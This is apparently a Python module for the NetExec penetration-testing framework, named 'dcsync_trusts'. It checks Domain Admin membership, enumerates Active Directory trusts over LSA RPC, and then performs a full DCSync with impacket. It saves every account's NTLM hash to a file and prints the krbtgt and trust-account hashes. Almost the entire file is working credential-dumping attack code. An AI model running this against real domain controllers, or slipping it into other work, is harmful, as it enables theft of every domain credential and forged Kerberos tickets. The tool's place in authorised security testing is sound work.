from impacket.dcerpc.v5 import samr, transport, lsat, lsad
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from contextlib import suppress
import traceback
from nxc.helpers.misc import CATEGORY, validate_ntlm


class NXCModule:
    """
    Module to perform DCSync, display krbtgt and trust hashes, and enumerate domain trusts.
    
    This module performs the following functions:
    1. Checks if the authenticated user is a member of the Domain Admins group (RID 512)
    2. Enumerates domain trust relationships via LSA RPC over SMB
    3. Performs a full DCSync against the DC and saves to a txt file
    4. Displays only the krbtgt user hash (NTLM) on screen
    5. Displays only the hashes of enumerated trust accounts (matching actual trusts)
    
    Requirements:
    - SMB connection with administrative privileges
    - Domain Controller access for SAMR, NTDS, and LSA operations
    
    Usage:
        nxc smb <dc_ip> -u <username> -p <password> -M dcsync_trusts
    
    Output:
    - Displays whether the user is a Domain Administrator
    - If Domain Admin:
      - Enumerates and displays domain trust relationships (via LSA RPC)
      - Performs full DCSync and saves all hashes to file
      - Displays only krbtgt NTLM hash on screen
      - Displays only trust account hashes that match enumerated trusts
    """

    name = "dcsync_trusts"
    description = "DCSync all hashes, display krbtgt and matching trust hashes, enumerate domain trusts"
    supported_protocols = ["smb"]
    category = CATEGORY.ENUMERATION

    def options(self, context, module_options):
        """No module options available"""
        pass

    def on_admin_login(self, context, connection):
        """Execute when admin login is successful"""
        try:
            # Check if current user is a Domain Admin
            is_domain_admin = self.check_domain_admin(context, connection)
            
            if is_domain_admin:
                context.log.success(f"User {connection.username} is a Domain Administrator!")
                
                # First enumerate domain trusts to get trust names and info
                trust_info_list = self.enumerate_trusts(context, connection)
                
                # Perform DCSync and extract hashes (will filter based on trust_info_list)
                self.perform_dcsync(context, connection, trust_info_list)
            else:
                context.log.fail(f"User {connection.username} is NOT a Domain Administrator")
                context.log.fail("Domain Admin privileges required for DCSync operations")
                
        except Exception as e:
            context.log.fail(f"Error in dcsync_trusts module: {e}")
            context.log.debug(traceback.format_exc())

    def get_dce_rpc(self, target, string_binding, dce_binding, connection):
        """Create DCE/RPC connection"""
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.setRemoteHost(target)
        rpctransport.set_credentials(
            connection.username,
            connection.password,
            connection.domain,
            connection.lmhash,
            connection.nthash,
            aesKey=connection.aesKey,
        )
        rpctransport.set_kerberos(connection.kerberos, connection.kdcHost)

        dce = rpctransport.get_dce_rpc()
        if connection.kerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_credentials(*rpctransport.get_credentials())
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(dce_binding)
        return dce

    def check_domain_admin(self, context, connection):
        """Check if the current user is a member of Domain Admins group"""
        try:
            # Connect to SAMR
            string_binding = fr"ncacn_np:{connection.kdcHost}[\pipe\samr]"
            dce = self.get_dce_rpc(connection.kdcHost, string_binding, samr.MSRPC_UUID_SAMR, connection)
            
            # Get domain information
            server_handle = samr.hSamrConnect2(dce)["ServerHandle"]
            domain = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)["Buffer"]["Buffer"][0]["Name"]
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
            domain_sid = resp["DomainId"].formatCanonical()
            domain_handle = samr.hSamrOpenDomain(dce, server_handle, samr.DOMAIN_LOOKUP | samr.DOMAIN_LIST_ACCOUNTS, resp["DomainId"])["DomainHandle"]
            
            context.log.debug(f"Resolved domain SID: {domain_sid}")
            
            # Domain Admins RID is 512
            domain_admin_rid = 512
            
            try:
                # Open Domain Admins group
                group_handle = samr.hSamrOpenGroup(dce, domain_handle, samr.GROUP_LIST_MEMBERS, domain_admin_rid)["GroupHandle"]
                resp = samr.hSamrGetMembersInGroup(dce, group_handle)
                
                # Check if current user is in the group
                for member in resp["Members"]["Members"]:
                    rid = int.from_bytes(member.getData(), byteorder="little")
                    try:
                        user_handle = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, rid)["UserHandle"]
                        username = samr.hSamrQueryInformationUser2(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)["Buffer"]["All"]["UserName"]
                        
                        if username.lower() == connection.username.lower():
                            context.log.debug(f"Found {username} in Domain Admins group")
                            return True
                            
                    except Exception as e:
                        context.log.debug(f"Failed to get user info for RID {rid}: {e}")
                    finally:
                        with suppress(Exception):
                            samr.hSamrCloseHandle(dce, user_handle)
                            
            except Exception as e:
                context.log.debug(f"Failed to get members of Domain Admins group: {e}")
            finally:
                with suppress(Exception):
                    samr.hSamrCloseHandle(dce, group_handle)
                    
            return False
            
        except Exception as e:
            context.log.fail(f"Error in check_domain_admin: {e}")
            context.log.debug(traceback.format_exc())
            return False

    def perform_dcsync(self, context, connection, trust_info_list=None):
        """Perform DCSync and extract all hashes, highlight krbtgt and trust accounts"""
        try:
            context.log.info("Starting DCSync operation...")
            
            # Enable remote operations
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            
            # Get bootkey
            try:
                bootkey = remote_ops.getBootKey()
            except Exception as e:
                context.log.fail(f"Failed to get bootkey: {e}")
                return
                
            # Initialize storage for special hashes
            self.krbtgt_hash = None
            self.trust_hashes = []
            self.all_hashes = []
            self.trust_info_list = trust_info_list or []
            
            # Prepare trust account names to match (convert trust names to account format)
            trust_account_names = set()
            if trust_info_list:
                for trust_info in trust_info_list:
                    flat_name = trust_info.get("flat_name", "")
                    if flat_name:
                        # Trust accounts are typically stored as TRUSTNAME$ or trust_name$
                        trust_account_names.add(f"{flat_name.upper()}$")
                        trust_account_names.add(f"{flat_name.lower()}$")
                        # Also try without domain suffix in case it's stored differently
                        base_name = flat_name.split('.')[0]
                        trust_account_names.add(f"{base_name.upper()}$")
                        trust_account_names.add(f"{base_name.lower()}$")
            
            def hash_callback(secret_type, secret):
                """Callback to capture all hashes and identify special ones"""
                if secret and ":" in secret:
                    # Store all hashes
                    self.all_hashes.append(secret)
                    
                    parts = secret.split(":")
                    if len(parts) >= 4:
                        username = parts[0].split("\\")[-1] if "\\" in parts[0] else parts[0]
                        
                        # Check for krbtgt
                        if username.lower() == "krbtgt":
                            lmhash = parts[2]
                            nthash = parts[3]
                            self.krbtgt_hash = f"{username}:{nthash}"
                        
                        # Check for trust accounts - only if they match enumerated trusts
                        elif username.endswith("$"):
                            # If we have trust names, only include matching accounts
                            if trust_account_names:
                                if username in trust_account_names:
                                    lmhash = parts[2]
                                    nthash = parts[3]
                                    self.trust_hashes.append(f"{username}:{nthash}")
                            # If no trust names enumerated, don't include any trust hashes
            
            # Perform DCSync with output file
            use_vss_method = False
            NTDSFileName = None
            output_file = f"dcsync_{connection.host}.txt"
            
            NTDS = NTDSHashes(
                NTDSFileName,
                bootkey,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=use_vss_method,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=output_file,
                justUser=None,  # Dump all users
                printUserStatus=True,
                perSecretCallback=lambda secret_type, secret: hash_callback(secret_type, secret),
            )
            
            context.log.info("Dumping NTDS (this may take a while)...")
            NTDS.dump()
            
            # Display results
            context.log.success(f"DCSync completed! {len(self.all_hashes)} hashes dumped to {output_file}.ntds")
            
            # Display krbtgt hash
            if self.krbtgt_hash:
                context.log.success("krbtgt account hash:")
                context.log.highlight(f"  {self.krbtgt_hash}")
            else:
                context.log.fail("krbtgt hash not found")
            
            # Display trust account hashes with trust information
            if self.trust_hashes:
                context.log.success(f"Found {len(self.trust_hashes)} trust account hash(es):")
                for trust_hash in self.trust_hashes:
                    # Extract account name from hash
                    account_name = trust_hash.split(":")[0]
                    # Find matching trust info
                    matching_trust = None
                    for trust_info in self.trust_info_list:
                        flat_name = trust_info.get("flat_name", "")
                        if flat_name and account_name.upper() == f"{flat_name.upper()}$":
                            matching_trust = trust_info
                            break
                        # Also try base name
                        base_name = flat_name.split('.')[0]
                        if base_name and account_name.upper() == f"{base_name.upper()}$":
                            matching_trust = trust_info
                            break
                    
                    # Display hash with trust info
                    context.log.highlight(f"  {trust_hash}")
                    if matching_trust:
                        trust_name = matching_trust.get("name", "Unknown")
                        direction = matching_trust.get("direction", "Unknown")
                        context.log.highlight(f"    → Trust with: {trust_name} (Direction: {direction})")
            else:
                context.log.info("No trust account hashes found")
                
            # Cleanup
            try:
                remote_ops.finish()
            except Exception as e:
                context.log.debug(f"Error in remote_ops.finish(): {e}")
            
            NTDS.finish()
                
        except Exception as e:
            context.log.fail(f"Error during DCSync: {e}")
            context.log.debug(traceback.format_exc())

    def enumerate_trusts(self, context, connection):
        """Enumerate domain trust relationships using LSA RPC over SMB"""
        trust_info_list = []
        try:
            context.log.info("Enumerating domain trust relationships via LSA RPC...")
            
            # Get current domain name
            current_domain = connection.domain
            
            # Create RPC connection to LSARPC
            try:
                string_binding = fr"ncacn_np:{connection.host}[\pipe\lsarpc]"
                dce = self.get_dce_rpc(connection.host, string_binding, lsat.MSRPC_UUID_LSAT, connection)
            except Exception as e:
                context.log.fail(f"Failed to connect to LSARPC: {e}")
                context.log.debug(traceback.format_exc())
                return trust_info_list
            
            # Open LSA policy handle
            try:
                resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
                policy_handle = resp["PolicyHandle"]
            except Exception as e:
                context.log.fail(f"Failed to open LSA policy: {e}")
                context.log.debug(traceback.format_exc())
                return trust_info_list
            
            # Enumerate trusted domains
            try:
                resp = lsad.hLsarEnumerateTrustedDomainsEx(dce, policy_handle)
                trusts = resp["EnumerationBuffer"]["EnumerationBuffer"]
            except Exception as e:
                context.log.fail(f"Failed to enumerate trusted domains: {e}")
                context.log.debug(traceback.format_exc())
                # Try closing the policy handle
                try:
                    lsad.hLsarClose(dce, policy_handle)
                except Exception:
                    pass
                return trust_info_list
            
            # Parse and display trusts
            trusts_found = 0
            for trust in trusts:
                try:
                    trusts_found += 1
                    trust_name = trust["Name"]["Buffer"] if trust["Name"] else "Unknown"
                    trust_flat_name = trust["FlatName"]["Buffer"] if trust["FlatName"] else "Unknown"
                    trust_direction = trust["TrustDirection"]
                    trust_type = trust["TrustType"]
                    trust_attributes = trust["TrustAttributes"]
                    
                    # Convert trust direction to text
                    direction_text = {
                        0: "Disabled",
                        1: "Inbound",
                        2: "Outbound",
                        3: "Bidirectional",
                    }.get(trust_direction, f"Unknown ({trust_direction})")
                    
                    # Convert trust type to text
                    trust_type_text = {
                        1: "Windows NT (Downlevel)",
                        2: "Active Directory (Uplevel)",
                        3: "MIT Kerberos",
                        4: "DCE",
                    }.get(trust_type, f"Unknown ({trust_type})")
                    
                    # Parse trust attributes
                    trust_attr_flags = []
                    if trust_attributes & 0x1:
                        trust_attr_flags.append("Non-Transitive")
                    if trust_attributes & 0x2:
                        trust_attr_flags.append("Uplevel-Only")
                    if trust_attributes & 0x4:
                        trust_attr_flags.append("Quarantined")
                    if trust_attributes & 0x8:
                        trust_attr_flags.append("Forest-Transitive")
                    if trust_attributes & 0x10:
                        trust_attr_flags.append("Cross-Organization")
                    if trust_attributes & 0x20:
                        trust_attr_flags.append("Within-Forest")
                    if trust_attributes & 0x40:
                        trust_attr_flags.append("Treat-As-External")
                    if trust_attributes & 0x80:
                        trust_attr_flags.append("Uses-RC4")
                    
                    trust_attr_text = ", ".join(trust_attr_flags) if trust_attr_flags else "None"
                    
                    # Store trust information for later use
                    trust_info = {
                        "name": trust_name,
                        "flat_name": trust_flat_name,
                        "direction": direction_text,
                        "type": trust_type_text,
                        "attributes": trust_attr_text
                    }
                    if trust_flat_name and trust_flat_name != "Unknown":
                        trust_info_list.append(trust_info)
                    
                    # Display trust relationship clearly
                    context.log.success(f"Trust relationship {trusts_found}:")
                    context.log.highlight(f"  {current_domain} ←→ {trust_name}")
                    context.log.highlight(f"  Flat Name: {trust_flat_name}")
                    context.log.highlight(f"  Direction: {direction_text}")
                    context.log.highlight(f"  Type: {trust_type_text}")
                    context.log.highlight(f"  Attributes: {trust_attr_text}")
                    
                except Exception as e:
                    context.log.debug(f"Error parsing trust entry: {e}")
                    context.log.debug(traceback.format_exc())
                    continue
            
            # Close policy handle
            try:
                lsad.hLsarClose(dce, policy_handle)
            except Exception as e:
                context.log.debug(f"Error closing LSA policy handle: {e}")
            
            if trusts_found == 0:
                context.log.info("No trust relationships found")
            
            return trust_info_list
                
        except Exception as e:
            context.log.fail(f"Error enumerating trusts: {e}")
            context.log.debug(traceback.format_exc())
            return trust_info_list
            context.log.debug(traceback.format_exc())
